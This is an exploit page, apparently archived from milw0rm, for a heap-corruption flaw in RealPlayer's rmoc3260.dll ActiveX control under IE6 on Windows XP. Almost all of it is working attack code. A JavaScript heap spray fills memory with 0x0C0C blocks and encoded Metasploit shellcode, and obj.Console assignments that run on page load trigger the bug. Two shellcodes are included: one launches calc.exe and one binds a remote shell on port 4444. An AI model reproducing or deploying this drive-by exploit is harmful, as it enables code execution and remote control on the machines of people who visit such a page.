<!-- 
Real Player rmoc3260.dll ActiveX Control Remote Code Execution Exploit(Heap Corruption)
written by e.b.
Tested on Windows XP SP2(fully patched) English, IE6, rmoc3260.dll version 6.0.10.45
Thanks to h.d.m. and the Metasploit crew
-->
<html>
 <head>
  <title>Real Player rmoc3260.dll ActiveX Control Remote Code Execution Exploit</title>
  <script language="JavaScript" defer>
    function Check() {
     
   


// win32_exec -  EXITFUNC=seh CMD=c:\windows\system32\calc.exe Size=378 Encoder=Alpha2 http://metasploit.com 

var shellcode1 = unescape("%u03eb%ueb59%ue805%ufff8%uffff%u4949%u4949%u4949%u4949%u4949%u4949%u4949%u4949%u3749%u5a51%u496a%u5058%u4130%u4130%u416b%u5941%u4241%u4132%u3241%u4142%u4230%u5841%u3850%u4241%u3975%u6a79%u364b%u5370%u526a%u656a%u6f63%u3339%u6d56%u6569%u446c%u4f41%u5570%u3464%u4e4a%u6a79%u4b42%u484a%u376b%u6b75%u4a58%u394b%u596f%u696f%u546f%u3230%u6f6c%u6e69%u4f79%u3969%u4b53%u304d%u6f38%u6c59%u6c59%u6f59%u5569%u4842%u4c59%u5255%u6832%u4b69%u7435%u5674%u4b72%u6e69%u7271%u4732%u6231%u5832%u4c6a%u5765%u7a62%u6e4d%u5a67%u4d41%u724a%u564a%u6b72%u4d57%u6f69%u756a%u7532%u5a42%u4c77%u6f4d%u325a%u6854%u684f%u5a4e%u6268%u6d32%u6f76%u506a%u7262%u4232%u694b%u4e63%u7977%u7050%u756a%u7a6f%u4d4d%u4b41%u6a70%u5566%u514a%u6f4e%u6b6d%u536c%u524b%u7950%u6b50%u6a76%u3567%u7342%u4464%u6952%u4f4f%u4f4d%u516a%u334a%u4278%u4e58%u507a%u4c58%u306a%u4b50%u444f%u4d52%u5741%u5962%u6c4f%u4d45%u304a%u705a%u5058%u6d78%u6e4b%u567a%u4238%u6e32%u6c79%u325a%u657a%u4542%u6533%u7242%u764e%u717a%u6c4f%u7257%u6332%u4a79%u4d53%u394d%u3050%u7a71%u4c69%u4c59%u6a59%u3739%u316a%u6a4f%u6a34%u586b%u454f%u5836%u704e%u4b65%u6773%u5262%u6c61%u6d33%u6f48%u5230%u6c51%u5a64%u6f39%u4f69%u3769%u416a%u6f4f%u4a7a%u396f%u424f%u4f39%u3657%u7879%u706c%u7463%u6e59%u424f%u6939%u5657%u637a%u7845%u3739%u6162%u6955%u3863%u4839%u634a%u4a56%u426e%u3355%u6f6e%u6f6d%u6f6a%u6c35%u6d38%u4b67%u534c%u6b6e%u4d6d%u4d4a%u4d4d%u4b31%u4e4c%u6e79%u6f79%u435a%u5969%u4b59%u6b79%u487a%u4f4f%u7139%u3876%u534e%u6455%u5352%u6b75%u6a79%u536a%u7a56%u516e%u6f79%u6339%u4a56%u706e%u4e6d%u664a%u5739%u3545%u664c%u3839%u656c%u4f30%u5a38%u786b%u4a4f%u516a%u6276%u4b6b%u6973%u7650%u3352%u344b%u6e37%u364a%u5239%u707a%u4d71%u736f%u4356%u5256%u4b46%u4b6e%u384c%u4f6d%u4a39%u384b%u4b76%u7a4a%u6b78%u4b4d%u784d%u6b6b%u794c%u687a%u6a6a%u6b39%u4b6e%u684c%u596d%u4d5a%u6830%u6a6a%u594d%u4b6c%u4b44%u7a6d%u6850%u6b6b%u7a4c%u385a%u4b6d%u3846%u4d6b%u6830%u4c58%u3859%u4a4e%u6b50%u6b47%u586c%u5961%u396c%u4e6a%u5979%u6d4c%u4a31%u7a50%u4a4d%u4c6d%u4a31%u394b%u586c%u6b78%u6f4d%u7969%u6c45%u4c36%u7938%u4b6d%u5a65%u5950%u5a6b%u794b%u6a68%u794b%u7a70%u6a78%u5a39%u584c%u6b6b%u3945%u6b64%u6b46%u7a47%u7839%u784c%u7a4b%u6b75%u4c6d%u5836%u696e%u3867%u6975%u4a66%u3958%u586d%u6c4d%u5936%u5a4f%u4a50%u6955%u4e6c%u4c38%u5159%u5178%u4164%u6464%u7430%u447a%u466f%u344f%u7337%u3147%u4467%u716e%u4163%u5268%u5044%u547a%u6479%u6479%u536e%u5053%u326f%u344d%u506f%u306d%u466d%u634f%u4254%u314f%u7067%u666e%u714e%u3475%u5038%u4d65%u4950");

// win32_bind -  EXITFUNC=seh LPORT=4444 Size=696 Encoder=Alpha2 http://metasploit.com 
var shellcode2 = unescape("%u03eb%ueb59%ue805%ufff8%uffff%u4949%u4949%u4949" +
                          "%u4949%u4949%u4949%u4949%u4949%u4937%u5a51%u436a" +
                          "%u3058%u3142%u4150%u6b42%u4141%u4153%u4132%u3241" +
                          "%u4142%u4230%u5841%u3850%u4241%u7875%u4b69%u724c" +
                          "%u584a%u526b%u4a6d%u4a48%u6b59%u6b4f%u694f%u416f" +
                          "%u4e70%u526b%u744c%u4164%u6e34%u376b%u5535%u4c6c" +
                          "%u714b%u646c%u6145%u7468%u6a41%u6e4f%u626b%u326f" +
                          "%u6c38%u334b%u376f%u5550%u7851%u316b%u6c59%u504b" +
                          "%u6e34%u466b%u6861%u456e%u6f61%u6c30%u6c59%u6b6c" +
                          "%u3934%u4150%u3764%u6877%u6941%u565a%u636d%u4b31" +
                          "%u7872%u6c6b%u7534%u566b%u3134%u5734%u5458%u6b35" +
                          "%u6e55%u336b%u556f%u7474%u7841%u416b%u4c76%u464b" +
                          "%u626c%u6e6b%u416b%u354f%u564c%u6861%u666b%u3663" +
                          "%u6c4c%u6b4b%u7239%u444c%u5764%u616c%u4f71%u4733" +
                          "%u6b41%u336b%u4c54%u634b%u7073%u6c30%u534b%u6470" +
                          "%u6c4c%u724b%u4550%u4e4c%u6c4d%u374b%u7530%u7358" +
                          "%u426e%u4c48%u524e%u466e%u586e%u566c%u3930%u586f" +
                          "%u7156%u4676%u7233%u6346%u3058%u7033%u3332%u5458" +
                          "%u5237%u4553%u5162%u504f%u4b54%u5a4f%u3370%u6a58" +
                          "%u686b%u596d%u456c%u466b%u4930%u596f%u7346%u4e6f" +
                          "%u5869%u7365%u4d56%u5851%u366d%u6468%u7242%u7275" +
                          "%u674a%u5972%u6e6f%u7230%u4a48%u5679%u6b69%u6e45" +
                          "%u764d%u6b37%u584f%u3356%u3063%u5053%u7653%u7033" +
                          "%u3353%u5373%u3763%u5633%u6b33%u5a4f%u3270%u5046" +
                          "%u3568%u7141%u304c%u3366%u6c63%u6d49%u6a31%u7035" +
                          "%u6e68%u3544%u524a%u4b50%u7177%u4b47%u4e4f%u3036" +
                          "%u526a%u3130%u7041%u5955%u6e6f%u3030%u6c68%u4c64" +
                          "%u546d%u796e%u3179%u5947%u596f%u4646%u6633%u6b35" +
                          "%u584f%u6350%u4b58%u7355%u4c79%u4146%u6359%u4b67" +
                          "%u784f%u7656%u5330%u4164%u3344%u7965%u4e6f%u4e30" +
                          "%u7173%u5878%u6167%u6969%u7156%u6269%u3977%u6a6f" +
                          "%u5176%u4945%u4e6f%u5130%u5376%u715a%u7274%u6246" +
                          "%u3048%u3063%u6c6d%u5a49%u6345%u625a%u7670%u3139" +
                          "%u5839%u4e4c%u4d69%u5337%u335a%u4e74%u4b69%u5652" +
                          "%u4b51%u6c70%u6f33%u495a%u336e%u4472%u6b6d%u374e" +
                          "%u7632%u6e4c%u6c73%u704d%u767a%u6c58%u4e6b%u4c4b" +
                          "%u736b%u5358%u7942%u6d6e%u7463%u6b56%u304f%u7075" +
                          "%u4b44%u794f%u5346%u706b%u7057%u7152%u5041%u4251" +
                          "%u4171%u337a%u4231%u4171%u5141%u6645%u6931%u5a6f" +
                          "%u5070%u6e68%u5a4d%u5679%u6865%u334e%u3963%u586f" +
                          "%u6356%u4b5a%u4b4f%u704f%u4b37%u4a4f%u4c70%u614b" +
                          "%u6b47%u4d4c%u6b53%u3174%u4974%u596f%u7046%u5952" +
                          "%u4e6f%u6330%u6c58%u6f30%u577a%u6174%u324f%u4b73" +
                          "%u684f%u3956%u386f%u4350");


	var bigblock = unescape("%u0C0C%u0C0C");
	var headersize = 20;
	var slackspace = headersize + shellcode1.length;
	while (bigblock.length < slackspace) bigblock += bigblock;
	var fillblock = bigblock.substring(0,slackspace);
	var block = bigblock.substring(0,bigblock.length - slackspace);
	while (block.length + slackspace < 0x40000) block = block + block + fillblock;

	

	var memory = new Array();
	for (i = 0; i < 400; i++){ memory[i] = block + shellcode1 }
	
	var buf = '';
	while (buf.length < 32) buf = buf + unescape("%0C");

	var m = '';

	m = obj.Console;
	obj.Console = buf;
	obj.Console = m;
	
	m = obj.Console;
	obj.Console = buf;
	obj.Console = m;
	
	
 } 
  
   </script>
  
  
</head>
 <body onload="JavaScript: return Check();">
	<object classid="clsid:2F542A2E-EDC9-4BF7-8CB1-87C9919F7F93" id="obj">
		Unable to create object
	</object>

 </body>
</html>

# milw0rm.com [2008-04-01]

